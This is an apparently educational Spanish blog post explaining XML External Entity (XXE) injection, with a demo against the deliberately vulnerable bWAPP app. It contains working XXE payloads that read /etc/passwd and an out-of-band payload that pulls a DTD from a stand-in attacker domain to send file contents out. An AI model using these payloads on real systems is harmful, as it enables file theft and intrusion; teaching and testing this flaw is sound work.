+++
date = "2015-05-30"
title = "XXE - XML External Entity - El Nuevo SQLi"
author = "Javier Olmedo"
+++

[![/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_banner.png](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_banner.png)](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_banner.png)

**XXE (Xml eXternal Entity)** es un tipo de vulnerabilidad que se produce en aplicaciones que hacen uso de **«parsers»** XML. Es decir aplicaciones que reciben como entrada un documento XML y para procesarlo hacen uso de alguna librería de parseo como LibXML, Xerces, MiniDOM, SAX etc. El atacante entonces puede aprovechar esta vulnerabilidad y enviar un documento XML especialmente manipulado para conseguir que el parser XML divulgue información del sistema, consuma recursos en exceso, ejecute comandos u otras formas de explotación.

El ataque solo es posible cuando la forma de interpretar el XML **permite incluir entidades externas** debido a su mala configuración. Puede llevar también a la lectura de archivos locales, descubrimiento y mapeo de red interna, denegaciones de servicio, etc.

## ¿Que es un DTD?

Un DTD y como sus siglas lo indican (Definicion del tipo de documento), se encarga de decirle a el parser XML (motor XML) **como va a estar compuesto un fichero de este tipo**. Cada vez que un xml es cargado, **el que se ocupa de verificar si dicho fichero presenta una estructura correcta**, entre otras cosas, es el parser XML y lo hace primero consultando el DTD.

Los DTD pueden encontrarse dentro del documento.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE secsignal [
]>
```

Todo lo que se encuentra dentro del tag **[]** es parte del DTD.
O externos al mismo.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE secsignal SYSTEM "fichero.dtd" [
]>
```

Dentro de un DTD podemos realizar varias declaraciones.

Podemos leer más sobre DTD [Aqui](https://www.w3schools.com/dtd/).

## ¿Donde puede encontrarse esta vulnerabilidad?

Suele ser común encontrarla en los siguientes **Content-Types: text/xml, application/xml**.
Aunque también puede darse al parsear un documento Word (son muchos archivos .xml) unidos y comprimidos o en JSON que luego se parsea en forma de XML.

## ¿Cómo se explota XXE?

Se trata de **malformar las peticiones con XML** de forma que añadamos funcionalidades al intérprete de XML como leer un archivo local y enviar su contenido a un servidor externo (/etc/passwd).

Por ejemplo, una petición legítima estaría formada de la siguiente manera:

```bash
<forgot><username>admin</username></forgot>
```

Con las siguientes cabeceras:

```bash
POST /forgotpw HTTP/1.1
Host: testhtml5.vulnweb.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101    Firefox/40.0
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://PAGINAVULNERABLE.COM
Content-Length: 43
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```

Nuestro objetivo para comprobar si es vulnerable es incluir nuestras propias etiquetas XML, como por ejemplo:

```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE etiqueta [
<!ELEMENT etiqueta ANY >
<!ENTITY entidad SYSTEM "file:///etc/passwd" >]><etiqueta>&entidad;</etiqueta>
```

De esta forma podremos leer cualquier archivo para el que el usuario que controla la aplicación tenga acceso, **llamar a cualquier binario** (ls, ping, ifconfig, nmap, rm, touch…. hay infinitas posibilidades), llamar a diferentes protocolos, como por ejemplo php://, ssh://, etc.

## Explotación práctica (demo)

Para realizar la demo he elegido una aplicación web que es vulnerable por diseño: bWAPP
Al acceder a la ruta vulnerable http://URL/bWAPP/xxe-1.php nos encontramos la siguiente aplicación web:

[![/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_001.png](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_001.png)](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_001.png)

Si llevamos a cabo la acción «deseada» por la web obtenemos una petición como la siguiente:

[![/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_002.png](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_002.png)](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_002.png)

Si queremos comprobar si es vulnerable trataremos de introducir una entidad externa y ver si nos devuelve un error o la procesa. Si hay error será que no es vulnerable, si por el contrario la procesa podremos seguir adelante con la explotación.

Para esta demo solicitaré a la aplicación el fichero /etc/passwd mediante entidades XML. Modificaré el contenido de la petición para añadirlo, quedando así:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Header [ <!ENTITY valor SYSTEM "///etc/passwd"> ]>
<reset><login>&valor;</login><secret>Any bugs?</secret></reset>
```

[![/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_003.png](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_003.png)](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_003.png)

Si procesamos la petición veremos que hemos tenido éxito y que **hemos obtenido el contenido del fichero**:

[![/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_004.png](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_004.png)](/images/xxe-xml-external-entity-el-nuevo-sqli/xxe-xml-external-entity-el-nuevo-sqli_004.png)

Ahora solo tendríamos que extender la explotación como quisiéramos, ya sea leyendo más archivos hasta obtener credenciales de acceso, escribiendo en archivos, llamando a protocolos, provocando un DoS al servidor…. sería dar rienda suelta a la imaginación.

Una de las opciones más usadas es solicitar al servidor un archivo como /etc/passwd y que envíe su contenido a un servidor en el que nosotros tengamos control de los logs o solicitar que se conecte a un .dtd que controlemos en nuestro servidor y que sea él quien le pida el contenido del archivo que deseamos leer.

Este podría ser nuestro DTD-PART

```xml
<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///"%three;"'>">
```

Y este el payload que enviamos a la aplicación:

```xml
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [
 <!ENTITY % one SYSTEM "http://DOMINIO-ATACANTE.COM/dtd-part" >
 %one;
 %two;
 %four;
 ]>
```

Quería dar las gracias a **Miguel Ángel Jimeno** ([@migueljimeno96[(https://x.com/migueljimeno96)]) , por permitirme publicar su post en la mayor parte de esta entrada, él ha sido quien ha redactado todo el proceso de explotación.

Podemos ver el post original en el foro de [Underc0de](https://underc0de.org/foro/bugs-y-exploits/entendiendo-y-explotando-xxe-(external-xml-entities)/).

Un Saludo y hasta la próxima.